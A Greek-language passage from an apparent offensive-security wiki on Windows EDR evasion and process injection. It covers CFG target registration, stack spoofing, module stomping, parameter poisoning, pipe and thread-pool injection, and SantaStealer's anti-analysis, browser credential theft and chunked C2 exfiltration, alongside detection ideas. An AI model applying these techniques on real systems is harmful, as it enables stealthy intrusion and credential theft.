Σε στόχους με ενεργό CFG, το πρώτο indirect jump σε gadget στη μέση συνάρτησης, όπως `jmp [rbx]` ή `jmp rdi`, συνήθως προκαλεί crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα metadata CFG του module. Για να λειτουργούν οι αλυσίδες τύπου Ekko/Kraken μέσα σε ενισχυμένες διεργασίες:<sup>[[30]](#references)</sup>

- Καταχωρίστε κάθε indirect destination που χρησιμοποιεί η αλυσίδα μέσω του `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από τη **βάση του image** και να καλύπτει **ολόκληρο το μέγεθος του image**.
- Για χειροκίνητα mapped/PIC/stomped regions, χρησιμοποιήστε τη **βάση της allocation** και το μέγεθος της allocation.
- Σημειώστε όχι μόνο το dispatch gadget, αλλά και τα exports που προσεγγίζονται έμμεσα (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και κάθε εκτελέσιμο section ελεγχόμενο από τον attacker που θα γίνει indirect target.

Έτσι, οι αλυσίδες ύπνου τύπου ROP/JOP μετατρέπονται από «λειτουργούν μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν μεταγλωττιστεί με `/guard:cf`.

### CET-safe πλαστογράφηση stack για threads σε αναμονή

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να αποτύχει σε συστήματα CET Shadow Stack, επειδή ένα πλαστογραφημένο `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι:<sup>[[30]](#references)</sup>

- Επιλέξτε ένα άλλο thread στην ίδια διεργασία και διαβάστε τα όρια του stack του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Δημιουργήστε αντίγραφο ασφαλείας του πραγματικού TEB/TIB του τρέχοντος thread.
- Καταγράψτε το πραγματικό context του thread που βρίσκεται σε αναμονή με το `GetThreadContext`.
- Αντιγράψτε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφα το spoofed `Rsp`/stack state.
- Κατά τη διάρκεια του sleep window, αντιγράψτε το `NT_TIB` του spoof thread στο τρέχον TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε ένα νόμιμο εύρος stack.
- Μόλις ολοκληρωθεί η αναμονή, επαναφέρετε το αρχικό TIB και το thread context.

Έτσι διατηρείται ένα instruction pointer συμβατό με το CET, ενώ παραπλανώνται οι EDR stack walkers που βασίζονται στα metadata stack του TEB για να επικυρώσουν τα unwinds.

### Εναλλακτική με APC: Kraken Mask

Αν το dispatch με timer-queue είναι υπερβολικά χαρακτηριστικό, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread με queued APCs:<sup>[[27]](#references)</sup>

- Δημιουργήστε ένα helper thread με entrypoint το `NtTestAlert`.
- Τοποθετήστε σε ουρά τα προετοιμασμένα frames `CONTEXT`/APCs με το `NtQueueApcThread` και εκτελέστε τα με το `NtAlertResumeThread`.
- Αποθηκεύστε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να αποφύγετε την εξάντληση του προεπιλεγμένου stack 64 KB του thread.
- Χρησιμοποιήστε το `NtSignalAndWaitForSingleObject` για να σηματοδοτήσετε ατομικά το start event και να μπλοκάρετε.
- Αναστείλετε το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειωθεί το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα stack που έχει αποκατασταθεί μόνο μερικώς.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα signature helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες για detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από τα `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` ακολουθούμενο από άμεσες εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που καταλήγουν έμμεσα στα `SystemFunction032`, `VirtualProtect` ή σε helpers αποκατάστασης δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Stomping ακριβούς module

Το module stomping εκτελεί payloads από το **`.text` section ενός DLL που έχει ήδη γίνει map μέσα στη διεργασία-στόχο**, αντί να δεσμεύει προφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο image που υποστηρίζεται από αρχείο στον δίσκο**, του οποίου ο χώρος κώδικα μπορεί να φιλοξενήσει το payload χωρίς να καταστρέψει διαδρομές κώδικα που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε κοινά modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι επισφαλές: το DLL μπορεί να μην έχει φορτωθεί στην απομακρυσμένη διεργασία, ενώ μια περιοχή κώδικα που είναι πολύ μικρή θα προκαλέσει crash της διεργασίας. Μια πιο αξιόπιστη ροή εργασίας είναι:

1. Απαριθμήστε τα modules της διεργασίας-στόχου και κρατήστε μια λίστα include **μόνο με ονόματα** των DLL που είναι ήδη φορτωμένα.
2. Δημιουργήστε πρώτα το payload και καταγράψτε το **ακριβές μέγεθός του σε bytes**.
3. Σαρώστε τα υποψήφια DLL στον δίσκο και συγκρίνετε το **`.text` `Misc_VirtualSize`** του PE section με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αποτυπώνει το μέγεθος του εκτελέσιμου section **όταν γίνεται map στη μνήμη**.
4. Αναλύστε τον **Export Address Table (EAT)** και επιλέξτε το RVA μιας exported function ως αρχικό offset για το stomp.
5. Υπολογίστε την **έκταση των επιπτώσεων**: αν το payload υπερβαίνει τα όρια της επιλεγμένης συνάρτησης, θα αντικαταστήσει γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Τυπικά helpers για recon/επιλογή στόχου που έχουν εμφανιστεί στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Λειτουργικές σημειώσεις
- Προτιμήστε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, για να αποφύγετε τα telemetry events του `LoadLibrary`/τις μη αναμενόμενες φορτώσεις image.
- Προτιμήστε exports που η εφαρμογή-στόχος εκτελεί σπάνια· διαφορετικά, κανονικές διαδρομές κώδικα ενδέχεται να εκτελέσουν τα stomped bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν να αλλάξει η ενσωμάτωση του shellcode από string literal σε **byte-array/braced initializer**, ώστε να αναπαρίσταται σωστά ολόκληρο το buffer στον πηγαίο κώδικα του injector.

Ιδέες για ανίχνευση
- Απομακρυσμένες εγγραφές σε εκτελέσιμες σελίδες που βασίζονται σε image (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες ιδιωτικές εκχωρήσεις RWX/RX.
- Σημεία εισόδου exports των οποίων τα bytes στη μνήμη δεν αντιστοιχούν πλέον στο backing file στον δίσκο.
- Απομακρυσμένα threads ή μεταβάσεις context που αρχίζουν την εκτέλεση μέσα σε export νόμιμου DLL του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες `.text` DLL, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε μια ήδη εκτελούμενη διεργασία-στόχο, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης της `CreateProcessW` στη θυγατρική διεργασία** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers που μπορούν να δηλητηριαστούν και αντιγράφονται από την `CreateProcessW`

Χρήσιμα carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για την `CreateProcessW` και περιορίζεται στους **32.767 χαρακτήρες Unicode**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα block περιβάλλοντος Unicode από διαδοχικές συμβολοσειρές `NAME=VALUE\0`, που τερματίζεται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση στο `ShellInfo` θα πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερή, τεκμηριωμένη σύμβαση.

Έτσι, η κανονική δημιουργία διεργασίας μετατρέπεται σε **primitive μεταφοράς payload**. Ο operator δημιουργεί τη θυγατρική διεργασία με δεδομένα εκκίνησης που ελέγχει ο επιτιθέμενος και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή απομακρυσμένης αναζήτησης χωρίς APIs απομακρυσμένης εγγραφής

Μετά τη δημιουργία της θυγατρικής διεργασίας, εντοπίστε το αντιγραμμένο buffer με primitives **μόνο για ανάγνωση**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του απομακρυσμένου `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργήστε κανονικά τη διεργασία (όχι σε αναστολή)
2. Κάντε εκτελέσιμη την επιλεγμένη σελίδα παραμέτρων με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποιήστε το handle του κύριου νήματος που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας υποκλοπής νήματος, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας μέσω του handle του κύριου νήματος που επιστράφηκε.

Έτσι αποφεύγονται αρκετά API που παρακολουθούνται συνήθως για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά επίσης `SuspendThread` / `ResumeThread`

### Περιορισμός του null byte και staged shellcode

Και οι τρεις φορείς είναι **δεδομένα τύπου string ή παρόμοια με string**, οπότε ένα raw payload που περιέχει `0x00` αποκόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **πρώτο στάδιο χωρίς null byte**, το οποίο ανασυνθέτει σταθερές κατά την εκτέλεση και στη συνέχεια φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο πρώτο στάδιο να δημιουργεί συμβολοσειρές στοίβας, ορίσματα API, διαδρομές DLL ή έναν loader δεύτερου σταδίου για shellcode, χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API βάσει στοίβας από το πρώτο στάδιο

Όταν το πρώτο στάδιο πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- κάνει push τη συμβολοσειρά/το buffer στη στοίβα του στόχου
- δεσμεύσει τον **χώρο shadow 32 byte για x64**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρήσει το `RSP` **ευθυγραμμισμένο στα 16 byte** πριν από την κλήση

Στη συνέχεια, ένα δεύτερο στάδιο μπορεί να αντιγραφεί από τη στοίβα σε μια εκχώρηση `PAGE_READWRITE`, η προστασία της να αλλάξει σε `PAGE_EXECUTE_READ` με `VirtualProtect` και να γίνει jump σε αυτήν, αποφεύγοντας μια άμεση εκχώρηση RWX.

### Ιδέες για ανίχνευση

Καλές ευκαιρίες για threat hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν εκτελέσιμες τις σελίδες παραμέτρων διεργασίας
- η αλλαγή προστασίας ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις του `PEB` και, στη συνέχεια, του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές υψηλής εντροπίας στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **τέχνασμα μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του ένας πλήρης μηχανισμός εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων εκτέλεσης και έναν τρόπο ανακατεύθυνσης της εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity, αλλά το απέρριψαν επειδή εσωτερικά καταλήγει σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

Για παράδοση payload σε μια **υπάρχουσα** διεργασία των Windows μέσω περιγραφών νημάτων, ακολουθούμενη από hijacking της διεύθυνσης επιστροφής νήματος σε αναμονή, δείτε το [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Μια διαδραστική θυγατρική διεργασία κονσόλας μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο της θυγατρικής διεργασίας σε ένα pipe και στέλνει έναν δείκτη ακολουθούμενο από shellcode. Αφού το πρόγραμμα κονσόλας διαβάσει τα δεδομένα στη δική του ιδιωτική μνήμη, ο injector εντοπίζει αυτό το buffer, του δίνει δικαιώματα εκτέλεσης και ανακατευθύνει ένα νήμα της θυγατρικής διεργασίας σε αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά πρόκειται και πάλι για process injection και όχι για γενική παράκαμψη EDR.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **ανώνυμο pipe**. Τα Windows υλοποιούν εσωτερικά τα ανώνυμα pipes με αντικείμενα pipe που έχουν μοναδικά ονόματα, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles με δυνατότητα κληρονόμησης και προεπιλεγμένο security descriptor, τοποθετεί το handle ανάγνωσης στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί μια νέα θυγατρική διεργασία με ενεργοποιημένη την κληρονόμηση handles. Επομένως, αυτό το PoC εκκινεί το παρεχόμενο εκτελέσιμο κονσόλας· δεν συνδέει το pipe του σε μια υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση χρησιμοποιεί την ακόλουθη ακολουθία:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη ανώνυμων pipes για τα `STDIN` και `STDOUT` της θυγατρικής διεργασίας. Απενεργοποιεί την κληρονόμηση στα δύο handles της γονικής διεργασίας και κλείνει τα αντίγραφα των handles της θυγατρικής διεργασίας στον γονέα μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο όπως το `netsh.exe` ή το `nslookup.exe` με `CREATE_NEW_CONSOLE`. Η θυγατρική διεργασία κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον πίνακα δυαδικών δεδομένων `rawData` με `WriteFile` μέσω του handle `STDIN` της γονικής διεργασίας. Το πρόγραμμα κονσόλας καταναλώνει τα bytes και αφήνει ένα αντίγραφο σε μία από τις ιδιωτικές δεσμευμένες περιοχές του.
4. Διατρέχει τον χώρο διευθύνσεων της θυγατρικής διεργασίας με `VirtualQueryEx`, διαβάζει υποψήφιες περιοχές `MEM_PRIVATE` με `ReadProcessMemory` και αναζητά τον δείκτη στην αρχή του `rawData`.
5. Αλλάζει την προστασία του buffer που εντοπίστηκε σε `PAGE_EXECUTE_READWRITE` με `VirtualProtectEx`.
6. Εντοπίζει το κύριο νήμα, το αναστέλλει, ορίζει το `RIP` σε `found_address + 0x19` με `NtSetContextThread` και συνεχίζει την εκτέλεσή του.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση είναι ειδική για x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι shellcode x64. Το `rawData` ξεκινά με έναν δείκτη 25 byte, επομένως τα εκτελέσιμα byte αρχίζουν στη δεκαεξαδική μετατόπιση `0x19`. Όταν αντικαθιστάτε το payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε μαζί τον δείκτη, το διάνυσμα αναζήτησης, το μέγεθος του πίνακα και τη μετατόπιση εκτέλεσης. Τα σχόλια του πηγαίου κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως κακούς χαρακτήρες. Αυτή η ροή εργασίας δεν τροποποιεί το token ή τα προνόμια του παιδιού.<sup>[[41]](#references)</sup>

Για μικρούς native βοηθούς και μοτίβα μεταγλώττισης payload, δείτε το [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Έγχυση DLL μέσω callback thread pool χωρίς shellcode (DLLParty)

Το DLLParty προσαρμόζει την έγχυση thread pool τύπου PoolParty, ώστε ένα υπάρχον worker της διεργασίας-στόχου να καλεί το `LoadLibraryA`, αντί να εκτελεί ένα εγχεόμενο stub callback. Ο μηχανισμός dispatch είναι ένα `TP_DIRECT` completion που τοποθετείται στην I/O completion port του pool-στόχου. Αυτό δεν παρακάμπτει τα δικαιώματα της διεργασίας: το PoC καλεί `OpenProcess(PROCESS_ALL_ACCESS)` και χρειάζεται μνήμη της διεργασίας-στόχου με δυνατότητα ανάγνωσης και εγγραφής, καθώς και handles worker-factory και completion-port που μπορούν να αντιγραφούν.<sup>[[46]](#references)[[47]](#references)</sup>

Στα Windows x64, το worker περνά έναν δείκτη προς το `TP_CALLBACK_INSTANCE` που βρίσκεται στη στοίβα του, στο `RCX`, το πρώτο όρισμα callback. Το `LoadLibraryA` ερμηνεύει τον ίδιο δείκτη ως `LPCSTR`. Στη διαδρομή που δοκιμάστηκε, το `TppWorkerThread` δημιουργεί τον δείκτη στο `RSP+0x178`, ενώ η πρώτη συνηθισμένη εγγραφή του σε αυτό το αντικείμενο γίνεται στο `RSP+0x1d0`. Επομένως, μια διαδρομή DLL με μηδενικό τερματισμό που χωρά στο αρχικό πρόθεμα των 0x58 byte μπορεί να τοποθετηθεί στην αρχή του instance χωρίς να αντικατασταθεί πριν από το dispatch. Πρόκειται για παρατήρηση που ισχύει για συγκεκριμένο build, όχι για τεκμηριωμένη εγγύηση του Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Η ροή εργασίας αναφοράς είναι η εξής:<sup>[[46]](#references)[[47]](#references)</sup>

1. Απαριθμήστε τα handles της διεργασίας-στόχου με το `NtQuerySystemInformation(SystemHandleInformation)` και εντοπίστε το `TpWorkerFactory` ρωτώντας τους τύπους αντικειμένων. Αντιγράψτε ένα handle worker-factory και ζητήστε το `WorkerFactoryBasicInformation`· το `StartParameter` δίνει το απομακρυσμένο `TP_POOL`. Παραλείψτε τα factory με `TotalWorkerCount == 0`.
2. Διαβάστε το `TP_POOL.CompletionPort` και διατρέξτε την ιδιωτική λίστα worker του pool. Στο build Windows 10 19045 x64 που δοκιμάστηκε (`ntdll.dll 10.0.19041.4842`), η κεφαλή της βρίσκεται στο `pool+0x60`· κάθε σύνδεσμος βρίσκεται στο `worker+0x10`, επομένως η θέση callback-instance στο `worker+0x38` ισούται με `link+0x28`. Το PoC ελέγχει τη στοίχιση των δεικτών, την αμοιβαιότητα των συνδέσμων, την ιδιοκτησία του pool, τα μη μηδενικά αναγνωριστικά νημάτων, τους επαναλαμβανόμενους κόμβους και τη σταθερότητα της κεφαλής της λίστας.
3. Γράψτε τη διαδρομή DLL σε **κάθε** θέση worker που ανακτήθηκε, επειδή οποιοδήποτε worker μπορεί να καταναλώσει το completion που τοποθετήθηκε στην ουρά. Τοποθετήστε ένα `TP_DIRECT` σε εγγράψιμη μνήμη της διεργασίας-στόχου, με `Callback = LoadLibraryA`. Το PoC χρησιμοποιεί το `last_slot-0x500` σε στοίβα worker αντί για `VirtualAllocEx`· αυτή η μετατόπιση είναι πειραματική και δεν πρέπει να συγκρούεται με ενεργά δεδομένα της στοίβας.
4. Αντιγράψτε το handle της completion port της διεργασίας-στόχου και καλέστε `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Η διεύθυνση του απομακρυσμένου `TP_DIRECT` είναι το κλειδί completion. Ένα υπάρχον worker καλεί τότε το `LoadLibraryA` με τον αντικατεστημένο δείκτη callback-instance και φορτώνει ένα DLL στο οποίο έχει ήδη πρόσβαση η διεργασία-στόχος.

Το PoC δέχεται PID στόχου (`DLLParty.exe <target_pid>`) και χρησιμοποιεί μια σταθερά ορισμένη διαδρομή DLL στο `DLLParty.cpp`· ορίστε μια διαδρομή στην οποία έχει πρόσβαση η διεργασία-στόχος πριν δημιουργήσετε εκτελέσιμο x64. Χρησιμοποιεί επίσης τη διεύθυνση `LoadLibraryA` της δικής του διεργασίας ως απομακρυσμένο callback, επομένως προϋποθέτει ότι αυτή η διεύθυνση είναι έγκυρη στη διεργασία-στόχο. Ο κώδικας δεν ελέγχει αν το μήκος της διαδρομής χωρά στο πρόθεμα των 0x58 byte ούτε αν η διάσχιση των worker εντόπισε κάποια θέση πριν από την πρόσβαση στο τελευταίο στοιχείο. Επαληθεύστε ξανά τις ιδιωτικές μετατοπίσεις, τη διάταξη της στοίβας και τον εγγράψιμο χώρο για το build-στόχο. Η παράλειψη των `CreateRemoteThreadEx`, shellcode και `VirtualAllocEx` δεν εξαλείφει τις εγγραφές μεταξύ διεργασιών ή τα telemetry φόρτωσης DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Τεχνικές SantaStealer για fileless αποφυγή εντοπισμού και κλοπή διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς οι σύγχρονοι info-stealers συνδυάζουν το AV bypass, την anti-analysis και την πρόσβαση σε διαπιστευτήρια σε μία ενιαία ροή εργασίας.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία ρύθμισης (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί κυριλλική διάταξη, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται πριν εκτελέσει τους stealers, διασφαλίζοντας ότι δεν ενεργοποιείται ποτέ σε εξαιρούμενες περιοχές, ενώ αφήνει ένα τεχνούργημα για αναζήτηση.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Διαδοχική λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, υπολογίζει checksum με προσαρμοσμένο κυλιόμενο αλγόριθμο για κάθε όνομα και το συγκρίνει με ενσωματωμένες λίστες αποκλεισμού για debuggers/sandboxes· επαναλαμβάνει τον υπολογισμό checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας, όπως το `C:\analysis`.
- Η παραλλαγή B επιθεωρεί ιδιότητες του συστήματος (ελάχιστο όριο πλήθους διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί το `OpenServiceA("VBoxGuest")` για να εντοπίσει τα additions του VirtualBox και εκτελεί ελέγχους χρονισμού γύρω από αναμονές, ώστε να εντοπίσει το single-stepping. Κάθε θετικό εύρημα ακυρώνει την εκτέλεση πριν από την εκκίνηση των modules.

### Fileless helper + διπλή reflective φόρτωση με ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα Chromium credential helper, το οποίο είτε αποθηκεύεται στον δίσκο είτε χαρτογραφείται χειροκίνητα στη μνήμη· στη fileless λειτουργία επιλύει μόνο του τα imports/relocations, ώστε να μην εγγράφονται αρχεία helper.
- Αυτό το helper αποθηκεύει ένα DLL δεύτερου σταδίου κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά 32 byte + nonce 12 byte). Μετά και τις δύο αποκρυπτογραφήσεις, φορτώνει το blob με reflective loading (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` που προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για να κάνουν injection σε ένα ενεργό πρόγραμμα περιήγησης Chromium, να κληρονομήσουν κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν κωδικούς πρόσβασης/cookies/πιστωτικές κάρτες απευθείας από βάσεις δεδομένων SQLite, παρά τη σκλήρυνση του ABE.


### Συλλογή αρθρωτά στη μνήμη και εξαγωγή δεδομένων μέσω HTTP σε τμήματα

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και δημιουργεί ένα thread ανά ενεργοποιημένο module (Telegram, Discord, Steam, στιγμιότυπα οθόνης, έγγραφα, επεκτάσεις browser κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει το πλήθος των αρχείων του μετά από περίοδο αναμονής σύνδεσης περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η συλλογή, όλα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` περιμένει 15 δευτερόλεπτα και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST στη διεύθυνση `http://<C2>:6767/upload`, πλαστογραφώντας ένα όριο `multipart/form-data` browser (`----WebKitFormBoundary***`). Σε κάθε τμήμα προστίθενται τα `User-Agent: upload`, `auth: <build_id>`, προαιρετικά το `w: <campaign_tag>`, ενώ στο τελευταίο τμήμα προστίθεται το `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασυναρμολόγηση.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
